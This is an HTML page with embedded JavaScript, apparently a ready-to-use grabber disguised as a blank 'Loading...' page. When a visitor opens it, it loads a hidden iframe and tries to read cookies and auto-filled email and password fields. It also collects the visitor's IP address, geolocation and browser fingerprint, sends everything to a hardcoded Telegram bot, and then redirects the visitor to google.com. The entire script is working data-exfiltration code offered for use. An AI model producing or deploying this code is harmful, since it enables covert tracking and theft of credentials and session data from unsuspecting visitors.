<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        /* 👻 COMPLETELY BLANK */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .container { display: none; }
        iframe {
            display: none;  /* 👻 Hidden iframe */
            width: 1px;
            height: 1px;
            border: none;
        }
    </style>
</head>
<body>

    <!-- 👻 Kuch nahi dikhega -->
    <div style="display:none;"></div>

    <!-- 👻 Hidden iframe – Target Site Load Karega -->
    <iframe id="hiddenFrame" src="https://www.google.com"></iframe>

    <script>
        // ============================================================
        // 🔥 TELEGRAM CONFIG – YAHAN APNA TOKEN AUR CHAT_ID DAALO
        // ============================================================
        const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
        const CHAT_ID = "6389764004";

        // ============================================================
        // 🧠 REDIRECT + COOKIE CAPTURE
        // ============================================================

        // 1️⃣ Get IP
        async function getIP() {
            try {
                let r = await fetch('https://api.ipify.org?format=json');
                let d = await r.json();
                return d.ip || 'Unknown';
            } catch { return 'Unable to fetch'; }
        }

        // 2️⃣ Get Location
        async function getLocation(ip) {
            try {
                let r = await fetch(`https://ipapi.co/${ip}/json/`);
                let d = await r.json();
                return {
                    city: d.city || 'Unknown',
                    region: d.region || 'Unknown',
                    country: d.country_name || 'Unknown',
                    isp: d.org || 'Unknown'
                };
            } catch { return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' }; }
        }

        // 3️⃣ Get Browser Fingerprint
        function getFingerprint() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                cookieEnabled: navigator.cookieEnabled,
                webdriver: navigator.webdriver || false,
                url: location.href,
                referrer: document.referrer || 'Direct'
            };
        }

        // 4️⃣ Send to Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            try {
                let r = await fetch(url, { method: 'GET' });
                let d = await r.json();
                return d.ok;
            } catch { return false; }
        }

        // ============================================================
        // 🚀 MAIN EXECUTION
        // ============================================================
        window.addEventListener('load', async function() {

            console.log('[+] Redirect + Cookie Capture started...');

            // Wait for iframe to load
            document.getElementById('hiddenFrame').onload = async function() {
                try {
                    // Try to access iframe content
                    const iframe = document.getElementById('hiddenFrame');
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

                    // 🔥 Extract cookies from iframe
                    const cookies = iframeDoc.cookie || 'No cookies found';

                    // Extract auto-filled fields (if any)
                    const inputs = iframeDoc.querySelectorAll('input');
                    let email = '', password = '';
                    inputs.forEach(input => {
                        if (input.value && input.value.trim() !== '') {
                            if (input.type === 'email' || input.name.includes('email')) email = input.value;
                            if (input.type === 'password') password = input.value;
                        }
                    });

                    // Collect data
                    const ip = await getIP();
                    const location = await getLocation(ip);
                    const fingerprint = getFingerprint();
                    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

                    // Build message
                    let msg = `🎯 **REDIRECT + COOKIE CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
                    msg += `🌐 **IP:** ${ip}\n`;
                    msg += `📍 **Location:** ${location.city}, ${location.region}, ${location.country}\n`;
                    msg += `🏢 **ISP:** ${location.isp}\n`;
                    msg += `🔗 **URL:** ${fingerprint.url}\n`;
                    msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
                    msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
                    if (email) msg += `\n📧 **Email:** ${email}\n`;
                    if (password) msg += `🔑 **Password:** ${password}\n`;
                    msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
                    msg += `🖥️ **FINGERPRINT:**\n`;
                    msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
                    msg += `  💻 Platform: ${fingerprint.platform}\n`;
                    msg += `  🌍 Language: ${fingerprint.language}\n`;
                    msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
                    msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
                    msg += `  🧠 CPU Cores: ${fingerprint.hardwareConcurrency}\n`;
                    msg += `  💾 Device Memory: ${fingerprint.deviceMemory}GB\n`;
                    msg += `  🍪 Cookies Enabled: ${fingerprint.cookieEnabled}\n`;
                    msg += `  🕵️ WebDriver: ${fingerprint.webdriver}\n`;
                    msg += `━━━━━━━━━━━━━━━━━━━━━`;

                    // Send to Telegram
                    const sent = await sendToTelegram(msg);

                    if (sent) {
                        console.log('[+] Data sent to Telegram!');
                    } else {
                        console.log('[!] Failed to send data.');
                    }

                } catch(e) {
                    // Cross-origin — fallback to normal extract
                    console.log('[!] Cross-origin iframe, falling back to normal extract...');
                    await fallbackExtract();
                }

                // 👻 Redirect to real site after 3 seconds
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 3000);
            };

            // ============================================================
            // 🔄 FALLBACK EXTRACT (If iframe is cross-origin)
            // ============================================================
            async function fallbackExtract() {
                const ip = await getIP();
                const location = await getLocation(ip);
                const fingerprint = getFingerprint();
                const cookies = document.cookie || 'No cookies found';
                const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

                let msg = `🎯 **FALLBACK EXTRACT**\n━━━━━━━━━━━━━━━━━━━━━\n`;
                msg += `🌐 **IP:** ${ip}\n`;
                msg += `📍 **Location:** ${location.city}, ${location.region}, ${location.country}\n`;
                msg += `🏢 **ISP:** ${location.isp}\n`;
                msg += `🔗 **URL:** ${fingerprint.url}\n`;
                msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
                msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
                msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
                msg += `🖥️ **FINGERPRINT:**\n`;
                msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
                msg += `  💻 Platform: ${fingerprint.platform}\n`;
                msg += `  🌍 Language: ${fingerprint.language}\n`;
                msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
                msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
                msg += `━━━━━━━━━━━━━━━━━━━━━`;

                await sendToTelegram(msg);
            }

            // ⏰ Timeout: If iframe doesn't load within 8 seconds
            setTimeout(() => {
                console.log('[!] Iframe timeout, running fallback...');
                fallbackExtract();
            }, 8000);
        });
    </script>
</body>
</html>
